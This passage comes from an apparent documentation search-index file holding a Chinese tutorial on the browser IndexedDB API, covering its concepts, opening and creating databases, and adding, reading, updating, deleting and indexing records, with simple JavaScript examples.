\u5c31\u662f\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u672c\u5730\u6570\u636e\u5e93\uff0c\u5b83\u53ef\u4ee5\u88ab\u7f51\u9875\u811a\u672c\u521b\u5efa\u548c\u64cd\u4f5c\u3002IndexedDB \u5141\u8bb8\u50a8\u5b58\u5927\u91cf\u6570\u636e\uff0c\u63d0\u4f9b\u67e5\u627e\u63a5\u53e3\uff0c\u8fd8\u80fd\u5efa\u7acb\u7d22\u5f15\u3002\u8fd9\u4e9b\u90fd\u662f LocalStorage \u6240\u4e0d\u5177\u5907\u7684\u3002\u5c31\u6570\u636e\u5e93\u7c7b\u578b\u800c\u8a00\uff0cIndexedDB \u4e0d\u5c5e\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff08\u4e0d\u652f\u6301 SQL \u67e5\u8be2\u8bed\u53e5\uff09\uff0c\u66f4\u63a5\u8fd1 NoSQL \u6570\u636e\u5e93\u3002 IndexedDB \u5177\u6709\u4ee5\u4e0b\u7279\u70b9\u3002 \uff081\uff09\u952e\u503c\u5bf9\u50a8\u5b58\u3002 IndexedDB \u5185\u90e8\u91c7\u7528\u5bf9\u8c61\u4ed3\u5e93\uff08object store\uff09\u5b58\u653e\u6570\u636e\u3002\u6240\u6709\u7c7b\u578b\u7684\u6570\u636e\u90fd\u53ef\u4ee5\u76f4\u63a5\u5b58\u5165\uff0c\u5305\u62ec JavaScript \u5bf9\u8c61\u3002\u5bf9\u8c61\u4ed3\u5e93\u4e2d\uff0c\u6570\u636e\u4ee5\u201c\u952e\u503c\u5bf9\u201d\u7684\u5f62\u5f0f\u4fdd\u5b58\uff0c\u6bcf\u4e00\u4e2a\u6570\u636e\u8bb0\u5f55\u90fd\u6709\u5bf9\u5e94\u7684\u4e3b\u952e\uff0c\u4e3b\u952e\u662f\u72ec\u4e00\u65e0\u4e8c\u7684\uff0c\u4e0d\u80fd\u6709\u91cd\u590d\uff0c\u5426\u5219\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 \uff082\uff09\u5f02\u6b65\u3002 IndexedDB \u64cd\u4f5c\u65f6\u4e0d\u4f1a\u9501\u6b7b\u6d4f\u89c8\u5668\uff0c\u7528\u6237\u4f9d\u7136\u53ef\u4ee5\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\uff0c\u8fd9\u4e0e LocalStorage \u5f62\u6210\u5bf9\u6bd4\uff0c\u540e\u8005\u7684\u64cd\u4f5c\u662f\u540c\u6b65\u7684\u3002\u5f02\u6b65\u8bbe\u8ba1\u662f\u4e3a\u4e86\u9632\u6b62\u5927\u91cf\u6570\u636e\u7684\u8bfb\u5199\uff0c\u62d6\u6162\u7f51\u9875\u7684\u8868\u73b0\u3002 \uff083\uff09\u652f\u6301\u4e8b\u52a1\u3002 IndexedDB \u652f\u6301\u4e8b\u52a1\uff08transaction\uff09\uff0c\u8fd9\u610f\u5473\u7740\u4e00\u7cfb\u5217\u64cd\u4f5c\u6b65\u9aa4\u4e4b\u4e2d\uff0c\u53ea\u8981\u6709\u4e00\u6b65\u5931\u8d25\uff0c\u6574\u4e2a\u4e8b\u52a1\u5c31\u90fd\u53d6\u6d88\uff0c\u6570\u636e\u5e93\u56de\u6eda\u5230\u4e8b\u52a1\u53d1\u751f\u4e4b\u524d\u7684\u72b6\u6001\uff0c\u4e0d\u5b58\u5728\u53ea\u6539\u5199\u4e00\u90e8\u5206\u6570\u636e\u7684\u60c5\u51b5\u3002 \uff084\uff09\u540c\u6e90\u9650\u5236\u3002 IndexedDB \u53d7\u5230\u540c\u6e90\u9650\u5236\uff0c\u6bcf\u4e00\u4e2a\u6570\u636e\u5e93\u5bf9\u5e94\u521b\u5efa\u5b83\u7684\u57df\u540d\u3002\u7f51\u9875\u53ea\u80fd\u8bbf\u95ee\u81ea\u8eab\u57df\u540d\u4e0b\u7684\u6570\u636e\u5e93\uff0c\u800c\u4e0d\u80fd\u8bbf\u95ee\u8de8\u57df\u7684\u6570\u636e\u5e93\u3002 \uff085\uff09\u50a8\u5b58\u7a7a\u95f4\u5927\u3002 IndexedDB \u7684\u50a8\u5b58\u7a7a\u95f4\u6bd4 LocalStorage \u5927\u5f97\u591a\uff0c\u4e00\u822c\u6765\u8bf4\u4e0d\u5c11\u4e8e 250MB\uff0c\u751a\u81f3\u6ca1\u6709\u4e0a\u9650\u3002 \uff086\uff09\u652f\u6301\u4e8c\u8fdb\u5236\u50a8\u5b58\u3002 IndexedDB \u4e0d\u4ec5\u53ef\u4ee5\u50a8\u5b58\u5b57\u7b26\u4e32\uff0c\u8fd8\u53ef\u4ee5\u50a8\u5b58\u4e8c\u8fdb\u5236\u6570\u636e\uff08ArrayBuffer \u5bf9\u8c61\u548c Blob \u5bf9\u8c61\uff09\u3002","title":"\u6982\u8ff0"},{"location":"bom/indexeddb/#_2","text":"IndexedDB \u662f\u4e00\u4e2a\u6bd4\u8f83\u590d\u6742\u7684 API\uff0c\u6d89\u53ca\u4e0d\u5c11\u6982\u5ff5\u3002\u5b83\u628a\u4e0d\u540c\u7684\u5b9e\u4f53\uff0c\u62bd\u8c61\u6210\u4e00\u4e2a\u4e2a\u5bf9\u8c61\u63a5\u53e3\u3002\u5b66\u4e60\u8fd9\u4e2a API\uff0c\u5c31\u662f\u5b66\u4e60\u5b83\u7684\u5404\u79cd\u5bf9\u8c61\u63a5\u53e3\u3002 \u6570\u636e\u5e93\uff1aIDBDatabase \u5bf9\u8c61 \u5bf9\u8c61\u4ed3\u5e93\uff1aIDBObjectStore \u5bf9\u8c61 \u7d22\u5f15\uff1a IDBIndex \u5bf9\u8c61 \u4e8b\u52a1\uff1a IDBTransaction \u5bf9\u8c61 \u64cd\u4f5c\u8bf7\u6c42\uff1aIDBRequest \u5bf9\u8c61 \u6307\u9488\uff1a IDBCursor \u5bf9\u8c61 \u4e3b\u952e\u96c6\u5408\uff1aIDBKeyRange \u5bf9\u8c61 \u4e0b\u9762\u662f\u4e00\u4e9b\u4e3b\u8981\u7684\u6982\u5ff5\u3002 \uff081\uff09\u6570\u636e\u5e93 \u6570\u636e\u5e93\u662f\u4e00\u7cfb\u5217\u76f8\u5173\u6570\u636e\u7684\u5bb9\u5668\u3002\u6bcf\u4e2a\u57df\u540d\uff08\u4e25\u683c\u7684\u8bf4\uff0c\u662f\u534f\u8bae + \u57df\u540d + \u7aef\u53e3\uff09\u90fd\u53ef\u4ee5\u65b0\u5efa\u4efb\u610f\u591a\u4e2a\u6570\u636e\u5e93\u3002 IndexedDB \u6570\u636e\u5e93\u6709\u7248\u672c\u7684\u6982\u5ff5\u3002\u540c\u4e00\u4e2a\u65f6\u523b\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u7248\u672c\u7684\u6570\u636e\u5e93\u5b58\u5728\u3002\u5982\u679c\u8981\u4fee\u6539\u6570\u636e\u5e93\u7ed3\u6784\uff08\u65b0\u589e\u6216\u5220\u9664\u8868\u3001\u7d22\u5f15\u6216\u8005\u4e3b\u952e\uff09\uff0c\u53ea\u80fd\u901a\u8fc7\u5347\u7ea7\u6570\u636e\u5e93\u7248\u672c\u5b8c\u6210\u3002 \uff082\uff09\u5bf9\u8c61\u4ed3\u5e93 \u6bcf\u4e2a\u6570\u636e\u5e93\u5305\u542b\u82e5\u5e72\u4e2a\u5bf9\u8c61\u4ed3\u5e93\uff08object store\uff09\u3002\u5b83\u7c7b\u4f3c\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u8868\u683c\u3002 \uff083\uff09\u6570\u636e\u8bb0\u5f55 \u5bf9\u8c61\u4ed3\u5e93\u4fdd\u5b58\u7684\u662f\u6570\u636e\u8bb0\u5f55\u3002\u6bcf\u6761\u8bb0\u5f55\u7c7b\u4f3c\u4e8e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u884c\uff0c\u4f46\u662f\u53ea\u6709\u4e3b\u952e\u548c\u6570\u636e\u4f53\u4e24\u90e8\u5206\u3002\u4e3b\u952e\u7528\u6765\u5efa\u7acb\u9ed8\u8ba4\u7684\u7d22\u5f15\uff0c\u5fc5\u987b\u662f\u4e0d\u540c\u7684\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u4e3b\u952e\u53ef\u4ee5\u662f\u6570\u636e\u8bb0\u5f55\u91cc\u9762\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e3a\u4e00\u4e2a\u9012\u589e\u7684\u6574\u6570\u7f16\u53f7\u3002 1 { id : 1 , text : 'foo' } \u4e0a\u9762\u7684\u5bf9\u8c61\u4e2d\uff0c id \u5c5e\u6027\u53ef\u4ee5\u5f53\u4f5c\u4e3b\u952e\u3002 \u6570\u636e\u4f53\u53ef\u4ee5\u662f\u4efb\u610f\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u9650\u4e8e\u5bf9\u8c61\u3002 \uff084\uff09\u7d22\u5f15 \u4e3a\u4e86\u52a0\u901f\u6570\u636e\u7684\u68c0\u7d22\uff0c\u53ef\u4ee5\u5728\u5bf9\u8c61\u4ed3\u5e93\u91cc\u9762\uff0c\u4e3a\u4e0d\u540c\u7684\u5c5e\u6027\u5efa\u7acb\u7d22\u5f15\u3002 \uff085\uff09\u4e8b\u52a1 \u6570\u636e\u8bb0\u5f55\u7684\u8bfb\u5199\u548c\u5220\u6539\uff0c\u90fd\u8981\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210\u3002\u4e8b\u52a1\u5bf9\u8c61\u63d0\u4f9b error \u3001 abort \u548c complete \u4e09\u4e2a\u4e8b\u4ef6\uff0c\u7528\u6765\u76d1\u542c\u64cd\u4f5c\u7ed3\u679c\u3002","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"bom/indexeddb/#_3","text":"IndexedDB \u6570\u636e\u5e93\u7684\u5404\u79cd\u64cd\u4f5c\uff0c\u4e00\u822c\u662f\u6309\u7167\u4e0b\u9762\u7684\u6d41\u7a0b\u8fdb\u884c\u7684\u3002\u8fd9\u4e2a\u90e8\u5206\u53ea\u7ed9\u51fa\u7b80\u5355\u7684\u4ee3\u7801\u793a\u4f8b\uff0c\u7528\u4e8e\u5feb\u901f\u4e0a\u624b\uff0c\u8be6\u7ec6\u7684\u5404\u4e2a\u5bf9\u8c61\u7684 API \u653e\u5728\u540e\u6587\u4ecb\u7ecd\u3002","title":"\u64cd\u4f5c\u6d41\u7a0b"},{"location":"bom/indexeddb/#_4","text":"\u4f7f\u7528 IndexedDB \u7684\u7b2c\u4e00\u6b65\u662f\u6253\u5f00\u6570\u636e\u5e93\uff0c\u4f7f\u7528 indexedDB.open() \u65b9\u6cd5\u3002 1 var request = window . indexedDB . open ( databaseName , version ); \u8fd9\u4e2a\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6570\u636e\u5e93\u7684\u540d\u5b57\u3002\u5982\u679c\u6307\u5b9a\u7684\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u65b0\u5efa\u6570\u636e\u5e93\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6574\u6570\uff0c\u8868\u793a\u6570\u636e\u5e93\u7684\u7248\u672c\u3002\u5982\u679c\u7701\u7565\uff0c\u6253\u5f00\u5df2\u6709\u6570\u636e\u5e93\u65f6\uff0c\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7248\u672c\uff1b\u65b0\u5efa\u6570\u636e\u5e93\u65f6\uff0c\u9ed8\u8ba4\u4e3a 1 \u3002 indexedDB.open() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a IDBRequest \u5bf9\u8c61\u3002\u8fd9\u4e2a\u5bf9\u8c61\u901a\u8fc7\u4e09\u79cd\u4e8b\u4ef6 error \u3001 success \u3001 upgradeneeded \uff0c\u5904\u7406\u6253\u5f00\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u7ed3\u679c\u3002 \uff081\uff09error \u4e8b\u4ef6 error \u4e8b\u4ef6\u8868\u793a\u6253\u5f00\u6570\u636e\u5e93\u5931\u8d25\u3002 1 2 3 request . onerror = function ( event ) { console . log ( '\u6570\u636e\u5e93\u6253\u5f00\u62a5\u9519' ); }; \uff082\uff09success \u4e8b\u4ef6 success \u4e8b\u4ef6\u8868\u793a\u6210\u529f\u6253\u5f00\u6570\u636e\u5e93\u3002 1 2 3 4 5 6 var db ; request . onsuccess = function ( event ) { db = request . result ; console . log ( '\u6570\u636e\u5e93\u6253\u5f00\u6210\u529f' ); }; \u8fd9\u65f6\uff0c\u901a\u8fc7 request \u5bf9\u8c61\u7684 result \u5c5e\u6027\u62ff\u5230\u6570\u636e\u5e93\u5bf9\u8c61\u3002 \uff083\uff09upgradeneeded \u4e8b\u4ef6 \u5982\u679c\u6307\u5b9a\u7684\u7248\u672c\u53f7\uff0c\u5927\u4e8e\u6570\u636e\u5e93\u7684\u5b9e\u9645\u7248\u672c\u53f7\uff0c\u5c31\u4f1a\u53d1\u751f\u6570\u636e\u5e93\u5347\u7ea7\u4e8b\u4ef6 upgradeneeded \u3002 1 2 3 4 5 var db ; request . onupgradeneeded = function ( event ) { db = event . target . result ; } \u8fd9\u65f6\u901a\u8fc7\u4e8b\u4ef6\u5bf9\u8c61\u7684 target.result \u5c5e\u6027\uff0c\u62ff\u5230\u6570\u636e\u5e93\u5b9e\u4f8b\u3002","title":"\u6253\u5f00\u6570\u636e\u5e93"},{"location":"bom/indexeddb/#_5","text":"\u65b0\u5efa\u6570\u636e\u5e93\u4e0e\u6253\u5f00\u6570\u636e\u5e93\u662f\u540c\u4e00\u4e2a\u64cd\u4f5c\u3002\u5982\u679c\u6307\u5b9a\u7684\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u65b0\u5efa\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u540e\u7eed\u7684\u64cd\u4f5c\u4e3b\u8981\u5728 upgradeneeded \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\u5b8c\u6210\uff0c\u56e0\u4e3a\u8fd9\u65f6\u7248\u672c\u4ece\u65e0\u5230\u6709\uff0c\u6240\u4ee5\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002 \u901a\u5e38\uff0c\u65b0\u5efa\u6570\u636e\u5e93\u4ee5\u540e\uff0c\u7b2c\u4e00\u4ef6\u4e8b\u662f\u65b0\u5efa\u5bf9\u8c61\u4ed3\u5e93\uff08\u5373\u65b0\u5efa\u8868\uff09\u3002 1 2 3 4 request . onupgradeneeded = function ( event ) { db = event . target . result ; var objectStore = db . createObjectStore ( 'person' , { keyPath : 'id' }); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u636e\u5e93\u65b0\u5efa\u6210\u529f\u4ee5\u540e\uff0c\u65b0\u589e\u4e00\u5f20\u53eb\u505a person \u7684\u8868\u683c\uff0c\u4e3b\u952e\u662f id \u3002 \u66f4\u597d\u7684\u5199\u6cd5\u662f\u5148\u5224\u65ad\u4e00\u4e0b\uff0c\u8fd9\u5f20\u8868\u683c\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u518d\u65b0\u5efa\u3002 1 2 3 4 5 6 7 request . onupgradeneeded = function ( event ) { db = event . target . result ; var objectStore ; if ( ! db . objectStoreNames . contains ( 'person' )) { objectStore = db . createObjectStore ( 'person' , { keyPath : 'id' }); } } \u4e3b\u952e\uff08key\uff09\u662f\u9ed8\u8ba4\u5efa\u7acb\u7d22\u5f15\u7684\u5c5e\u6027\u3002\u6bd4\u5982\uff0c\u6570\u636e\u8bb0\u5f55\u662f { id: 1, name: '\u5f20\u4e09' } \uff0c\u90a3\u4e48 id \u5c5e\u6027\u53ef\u4ee5\u4f5c\u4e3a\u4e3b\u952e\u3002\u4e3b\u952e\u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e3a\u4e0b\u4e00\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u6bd4\u5982 { foo: { bar: 'baz' } } \u7684 foo.bar \u4e5f\u53ef\u4ee5\u6307\u5b9a\u4e3a\u4e3b\u952e\u3002 \u5982\u679c\u6570\u636e\u8bb0\u5f55\u91cc\u9762\u6ca1\u6709\u5408\u9002\u4f5c\u4e3a\u4e3b\u952e\u7684\u5c5e\u6027\uff0c\u90a3\u4e48\u53ef\u4ee5\u8ba9 IndexedDB \u81ea\u52a8\u751f\u6210\u4e3b\u952e\u3002 1 2 3 4 var objectStore = db . createObjectStore ( 'person' , { autoIncrement : true } ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6307\u5b9a\u4e3b\u952e\u4e3a\u4e00\u4e2a\u9012\u589e\u7684\u6574\u6570\u3002 \u65b0\u5efa\u5bf9\u8c61\u4ed3\u5e93\u4ee5\u540e\uff0c\u4e0b\u4e00\u6b65\u53ef\u4ee5\u65b0\u5efa\u7d22\u5f15\u3002 1 2 3 4 5 6 request . onupgradeneeded = function ( event ) { db = event . target . result ; var objectStore = db . createObjectStore ( 'person' , { keyPath : 'id' }); objectStore . createIndex ( 'name' , 'name' , { unique : false }); objectStore . createIndex ( 'email' , 'email' , { unique : true }); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c IDBObject.createIndex() \u7684\u4e09\u4e2a\u53c2\u6570\u5206\u522b\u4e3a\u7d22\u5f15\u540d\u79f0\u3001\u7d22\u5f15\u6240\u5728\u7684\u5c5e\u6027\u3001\u914d\u7f6e\u5bf9\u8c61\uff08\u8bf4\u660e\u8be5\u5c5e\u6027\u662f\u5426\u5305\u542b\u91cd\u590d\u7684\u503c\uff09\u3002","title":"\u65b0\u5efa\u6570\u636e\u5e93"},{"location":"bom/indexeddb/#_6","text":"\u65b0\u589e\u6570\u636e\u6307\u7684\u662f\u5411\u5bf9\u8c61\u4ed3\u5e93\u5199\u5165\u6570\u636e\u8bb0\u5f55\u3002\u8fd9\u9700\u8981\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function add () { var request = db . transaction ([ 'person' ], 'readwrite' ) . objectStore ( 'person' ) . add ({ id : 1 , name : '\u5f20\u4e09' , age : 24 , email : 'zhangsan@example.com' }); request . onsuccess = function ( event ) { console . log ( '\u6570\u636e\u5199\u5165\u6210\u529f' ); }; request . onerror = function ( event ) { console . log ( '\u6570\u636e\u5199\u5165\u5931\u8d25' ); } } add (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5199\u5165\u6570\u636e\u9700\u8981\u65b0\u5efa\u4e00\u4e2a\u4e8b\u52a1\u3002\u65b0\u5efa\u65f6\u5fc5\u987b\u6307\u5b9a\u8868\u683c\u540d\u79f0\u548c\u64cd\u4f5c\u6a21\u5f0f\uff08\u201c\u53ea\u8bfb\u201d\u6216\u201c\u8bfb\u5199\u201d\uff09\u3002\u65b0\u5efa\u4e8b\u52a1\u4ee5\u540e\uff0c\u901a\u8fc7 IDBTransaction.objectStore(name) \u65b9\u6cd5\uff0c\u62ff\u5230 IDBObjectStore \u5bf9\u8c61\uff0c\u518d\u901a\u8fc7\u8868\u683c\u5bf9\u8c61\u7684 add() \u65b9\u6cd5\uff0c\u5411\u8868\u683c\u5199\u5165\u4e00\u6761\u8bb0\u5f55\u3002 \u5199\u5165\u64cd\u4f5c\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u901a\u8fc7\u76d1\u542c\u8fde\u63a5\u5bf9\u8c61\u7684 success \u4e8b\u4ef6\u548c error \u4e8b\u4ef6\uff0c\u4e86\u89e3\u662f\u5426\u5199\u5165\u6210\u529f\u3002","title":"\u65b0\u589e\u6570\u636e"},{"location":"bom/indexeddb/#_7","text":"\u8bfb\u53d6\u6570\u636e\u4e5f\u662f\u901a\u8fc7\u4e8b\u52a1\u5b8c\u6210\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function read () { var transaction = db . transaction ([ 'person' ]); var objectStore = transaction . objectStore ( 'person' ); var request = objectStore . get ( 1 ); request . onerror = function ( event ) { console . log ( '\u4e8b\u52a1\u5931\u8d25' ); }; request . onsuccess = function ( event ) { if ( request . result ) { console . log ( 'Name: ' + request . result . name ); console . log ( 'Age: ' + request . result . age ); console . log ( 'Email: ' + request . result . email ); } else { console . log ( '\u672a\u83b7\u5f97\u6570\u636e\u8bb0\u5f55' ); } }; } read (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c objectStore.get() \u65b9\u6cd5\u7528\u4e8e\u8bfb\u53d6\u6570\u636e\uff0c\u53c2\u6570\u662f\u4e3b\u952e\u7684\u503c\u3002","title":"\u8bfb\u53d6\u6570\u636e"},{"location":"bom/indexeddb/#_8","text":"\u904d\u5386\u6570\u636e\u8868\u683c\u7684\u6240\u6709\u8bb0\u5f55\uff0c\u8981\u4f7f\u7528\u6307\u9488\u5bf9\u8c61 IDBCursor\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function readAll () { var objectStore = db . transaction ( 'person' ). objectStore ( 'person' ); objectStore . openCursor (). onsuccess = function ( event ) { var cursor = event . target . result ; if ( cursor ) { console . log ( 'Id: ' + cursor . key ); console . log ( 'Name: ' + cursor . value . name ); console . log ( 'Age: ' + cursor . value . age ); console . log ( 'Email: ' + cursor . value . email ); cursor . continue (); } else { console . log ( '\u6ca1\u6709\u66f4\u591a\u6570\u636e\u4e86\uff01' ); } }; } readAll (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u65b0\u5efa\u6307\u9488\u5bf9\u8c61\u7684 openCursor() \u65b9\u6cd5\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u6240\u4ee5\u8981\u76d1\u542c success \u4e8b\u4ef6\u3002","title":"\u904d\u5386\u6570\u636e"},{"location":"bom/indexeddb/#_9","text":"\u66f4\u65b0\u6570\u636e\u8981\u4f7f\u7528 IDBObject.put() \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function update () { var request = db . transaction ([ 'person' ], 'readwrite' ) . objectStore ( 'person' ) . put ({ id : 1 , name : '\u674e\u56db' , age : 35 , email : 'lisi@example.com' }); request . onsuccess = function ( event ) { console . log ( '\u6570\u636e\u66f4\u65b0\u6210\u529f' ); }; request . onerror = function ( event ) { console . log ( '\u6570\u636e\u66f4\u65b0\u5931\u8d25' ); } } update (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c put() \u65b9\u6cd5\u81ea\u52a8\u66f4\u65b0\u4e86\u4e3b\u952e\u4e3a 1 \u7684\u8bb0\u5f55\u3002","title":"\u66f4\u65b0\u6570\u636e"},{"location":"bom/indexeddb/#_10","text":"IDBObjectStore.delete() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u8bb0\u5f55\u3002 1 2 3 4 5 6 7 8 9 10 11 function remove () { var request = db . transaction ([ 'person' ], 'readwrite' ) . objectStore ( 'person' ) . delete ( 1 ); request . onsuccess = function ( event ) { console . log ( '\u6570\u636e\u5220\u9664\u6210\u529f' ); }; } remove ();","title":"\u5220\u9664\u6570\u636e"},{"location":"bom/indexeddb/#_11","text":"\u7d22\u5f15\u7684\u610f\u4e49\u5728\u4e8e\uff0c\u53ef\u4ee5\u8ba9\u4f60\u641c\u7d22\u4efb\u610f\u5b57\u6bb5\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ece\u4efb\u610f\u5b57\u6bb5\u62ff\u5230\u6570\u636e\u8bb0\u5f55\u3002\u5982\u679c\u4e0d\u5efa\u7acb\u7d22\u5f15\uff0c\u9ed8\u8ba4\u53ea\u80fd\u641c\u7d22\u4e3b\u952e\uff08\u5373\u4ece\u4e3b\u952e\u53d6\u503c\uff09\u3002 \u5047\u5b9a\u65b0\u5efa\u8868\u683c\u7684\u65f6\u5019\uff0c\u5bf9 name \u5b57\u6bb5\u5efa\u7acb\u4e86\u7d22\u5f15\u3002 1 objectStore . createIndex ( 'name' , 'name' , { unique : false }); \u73b0\u5728\uff0c\u5c31\u53ef\u4ee5\u4ece name \u627e\u5230\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\u4e86\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var transaction = db . transaction ([ 'person' ], 'readonly' ); var store = transaction . objectStore ( 'person' ); var index = store . index ( 'name' ); var request = index . get ( '\u674e\u56db' ); request . onsuccess = function ( e ) { var result = e . target . result ; if ( result ) { // ... } else { // ... } }","title":"\u4f7f\u7528\u7d22\u5f15"},{"location":"bom/indexeddb/#indexeddb","text":"\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b indexedDB \u5bf9\u8c61\uff0c\u4f5c\u4e3a\u5f00\u53d1\u8005\u7684\u64cd\u4f5c\u63a5\u53e3\u3002","title":"indexedDB \u5bf9\u8c61"},{"location":"bom/indexeddb/#indexeddbopen","text":"indexedDB.open() \u65b9\u6cd5\u7528\u4e8e\u6253\u5f00\u6570\u636e\u5e93\u3002\u8fd9\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u4f46\u662f\u4f1a\u7acb\u523b\u8fd4\u56de\u4e00\u4e2a IDBOpenDBRequest \u5bf9\u8c61\u3002 1 var openRequest = window . indexedDB . open ( 'test' , 1 ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u6253\u5f00\u4e00\u4e2a\u540d\u4e3a test \u3001\u7248\u672c\u4e3a 1 \u7684\u6570\u636e\u5e93\u3002\u5982\u679c\u8be5\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u65b0\u5efa\u8be5\u6570\u636e\u5e93\u3002 open() \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6570\u636e\u5e93\u540d\u79f0\uff0c\u683c\u5f0f\u4e3a\u5b57\u7b26\u4e32\uff0c\u4e0d\u53ef\u7701\u7565\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6570\u636e\u5e93\u7248\u672c\uff0c\u662f\u4e00\u4e2a\u5927\u4e8e 0 \u7684\u6b63\u6574\u6570\uff08 0 \u5c06\u62a5\u9519\uff09\uff0c\u5982\u679c\u8be5\u53c2\u6570\u5927\u4e8e\u5f53\u524d\u7248\u672c\uff0c\u4f1a\u89e6\u53d1\u6570\u636e\u5e93\u5347\u7ea7\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u7701\u7565\uff0c\u5982\u679c\u6570\u636e\u5e93\u5df2\u5b58\u5728\uff0c\u5c06\u6253\u5f00\u5f53\u524d\u7248\u672c\u7684\u6570\u636e\u5e93\uff1b\u5982\u679c\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c06\u521b\u5efa\u8be5\u7248\u672c\u7684\u6570\u636e\u5e93\uff0c\u9ed8\u8ba4\u7248\u672c\u4e3a 1 \u3002 \u6253\u5f00\u6570\u636e\u5e93\u662f\u5f02\u6b65\u64cd\u4f5c\uff0c\u901a\u8fc7\u5404\u79cd\u4e8b\u4ef6\u901a\u77e5\u5ba2\u6237\u7aef\u3002\u4e0b\u9762\u662f\u6709\u53ef\u80fd\u89e6\u53d1\u76844\u79cd\u4e8b\u4ef6\u3002 success \uff1a\u6253\u5f00\u6210\u529f\u3002 error \uff1a\u6253\u5f00\u5931\u8d25\u3002 upgradeneeded \uff1a\u7b2c\u4e00\u6b21\u6253\u5f00\u8be5\u6570\u636e\u5e93\uff0c\u6216\u8005\u6570\u636e\u5e93\u7248\u672c\u53d1\u751f\u53d8\u5316\u3002 blocked \uff1a\u4e0a\u4e00\u6b21\u7684\u6570\u636e\u5e93\u8fde\u63a5\u8fd8\u672a\u5173\u95ed\u3002 \u7b2c\u4e00\u6b21\u6253\u5f00\u6570\u636e\u5e93\u65f6\uff0c\u4f1a\u5148\u89e6\u53d1 upgradeneeded \u4e8b\u4ef6\uff0c\u7136\u540e\u89e6\u53d1 success \u4e8b\u4ef6\u3002 \u6839\u636e\u4e0d\u540c\u7684\u9700\u8981\uff0c\u5bf9\u4e0a\u97624\u79cd\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var openRequest = indexedDB . open ( 'test' , 1 ); var db ; openRequest . onupgradeneeded = function ( e ) { console . log ( 'Upgrading...' ); } openRequest . onsuccess = function ( e ) { console . log ( 'Success!' ); db = openRequest . result ; } openRequest . onerror = function ( e ) { console . log ( 'Error' ); console . log ( e ); } \u4e0a\u9762\u4ee3\u7801\u6709\u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002\u9996\u5148\uff0c open() \u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08IDBOpenDBRequest\uff09\uff0c\u76d1\u542c\u51fd\u6570\u5c31\u5b9a\u4e49\u5728\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u9762\u3002\u5176\u6b21\uff0c success \u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u4ece openRequest.result \u5c5e\u6027\u53ef\u4ee5\u62ff\u5230\u5df2\u7ecf\u6253\u5f00\u7684 IndexedDB \u6570\u636e\u5e93\u5bf9\u8c61\u3002","title":"indexedDB.open()"},{"location":"bom/indexeddb/#indexeddbdeletedatabase","text":"indexedDB.deleteDatabase() 